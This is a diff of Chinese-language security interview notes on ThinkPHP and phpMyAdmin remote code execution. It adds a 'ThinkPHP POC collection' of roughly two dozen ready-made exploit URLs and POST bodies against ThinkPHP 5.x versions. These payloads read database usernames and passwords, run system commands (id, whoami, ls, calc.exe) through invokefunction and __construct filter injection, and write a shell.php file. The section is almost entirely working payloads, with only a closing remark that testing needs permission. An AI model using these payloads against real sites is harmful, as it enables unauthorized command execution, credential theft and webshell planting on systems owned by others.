@@ -2,9 +2,54 @@
 在docker中复现了多种版本的rce漏洞。
 
 **漏洞的原理有了解吗,攻击后的返回包的有分析过吗?**
-THINKPHP RCE漏洞的原理：举例有一个RCE是这样的：Dispatcher.class.php中res参数中使用了**preg_replace**的/e危险参数，使得preg_replace第二个参数就会被当做php代码执行，导致存在一个代码执行漏洞，攻击者可以利用构造的恶意URL执行任意PHP代码。
+THINKPHP RCE漏洞的原理：举例有一个RCE是这样的：Dispatcher.class.php中res参数中使用了preg_replace的/e危险参数，使得preg_replace第二个参数就会被当做php代码执行，导致存在一个代码执行漏洞，攻击者可以利用构造的恶意URL执行任意PHP代码。
 
 ^
 phpMyadmin漏洞：
 <https://dummykitty.github.io/php/2020/11/22/phpmyadmin-%E5%90%8E%E5%8F%B0-getshell-%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF%E6%95%B4%E7%90%86.html#cve-2013-3238>
 
+
+^
+## **Thinkphp POC大全**
+
+**Thinkphp 5.0.22 POC**
+1. `http://192.168.1.1/thinkphp/public/?s=.|think\config/get&name=database.username`
+2. `http://192.168.1.1/thinkphp/public/?s=.|think\config/get&name=database.password`
+3. `http://url/to/thinkphp_5.0.22/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id`
+4. `http://url/to/thinkphp_5.0.22/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1`
+
+**Thinkphp 5 POC**
+5. `http://127.0.0.1/tp5/public/?s=index/\think\View/display&content=%22%3C?%3E%3C?php%20phpinfo();?%3E&data=1`
+
+**Thinkphp 5.0.21 POC**
+6. `http://localhost/thinkphp_5.0.21/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id`
+7. `http://localhost/thinkphp_5.0.21/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1`
+
+**Thinkphp 5.1.* POC**
+8. `http://url/to/thinkphp5.1.29/?s=index/\think\Request/input&filter=phpinfo&data=1`
+9. `http://url/to/thinkphp5.1.29/?s=index/\think\Request/input&filter=system&data=cmd`
+10. `http://url/to/thinkphp5.1.29/?s=index/\think\template\driver\file/write&cacheFile=shell.php&content=%3C?php%20phpinfo();?%3E`
+11. `http://url/to/thinkphp5.1.29/?s=index/\think\view\driver\Php/display&content=%3C?php%20phpinfo();?%3E`
+12. `http://url/to/thinkphp5.1.29/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1`
+13. `http://url/to/thinkphp5.1.29/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=cmd`
+14. `http://url/to/thinkphp5.1.29/?s=index/\think\Container/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1`
+15. `http://url/to/thinkphp5.1.29/?s=index/\think\Container/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=cmd`
+
+**Thinkphp 未知版本 POC**
+16. `?s=index/\think\module/action/param1/${@phpinfo()}`
+17. `?s=index/\think\Module/Action/Param/${@phpinfo()}`
+18. `?s=index/\think/module/aciton/param1/${@print(THINK_VERSION)}`
+
+**Thinkphp 5.0.23 (完整版) debug模式 POC**
+32. `(post)public/index.php (data)_method=__construct&filter[]=system&server[REQUEST_METHOD]=touch%20/tmp/xxx`
+
+**Thinkphp 5.0.23 (完整版) POC**
+33. `（post）public/index.php?s=captcha (data) _method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=ls -al`
+
+**Thinkphp 5.0.10 (完整版) POC**
+34. `(post)public/index.php?s=index/index/index (data)s=whoami&_method=__construct&method&filter[]=system`
+
+**Thinkphp 5.1.* 和 5.2.* 和 5.0.* POC**
+35. `(post)public/index.php (data)c=exec&f=calc.exe&_method=filter`
+
+请注意，这些POC（Proof of Concept，概念验证）用于测试网站是否存在远程代码执行漏洞。使用这些POC进行测试时，必须确保您有权限对目标网站进行安全测试，未经授权的测试可能违反法律。
